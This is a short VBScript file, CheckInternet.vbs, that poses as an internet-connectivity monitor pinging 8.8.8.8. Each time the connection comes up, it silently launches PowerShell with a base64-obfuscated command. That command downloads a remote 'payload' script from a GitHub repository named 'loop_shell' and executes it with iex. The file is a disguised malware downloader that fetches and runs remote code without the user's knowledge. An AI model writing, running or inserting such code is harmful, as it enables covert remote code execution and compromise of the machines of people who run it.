' CheckInternet.vbs

Dim objShell, wasConnected
Set objShell = CreateObject("WScript.Shell")
wasConnected = False

encodedCommand = "aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbgBhAHAAcgBpAHYAYQB0AGUALwBsAG8AbwBwAF8AcwBoAGUAbABsAC8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA=="

Do
    Dim pingResult
    pingResult = False

    ' Ping 8.8.8.8 once
    Set ping = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery _
        ("select * from Win32_PingStatus where address = '8.8.8.8' and timeout = 1000")

    For Each reply In ping
        If reply.StatusCode = 0 Then
            pingResult = True
        End If
    Next

    If pingResult = True And wasConnected = False Then
        ' Internet just connected, run encoded powershell silently
        objShell.Run "powershell.exe -EncodedCommand " & encodedCommand, 0, False
        wasConnected = True
    ElseIf pingResult = False Then
        ' Internet disconnected
        wasConnected = False
    End If

    WScript.Sleep 5000 ' Wait 5 seconds before next check
Loop
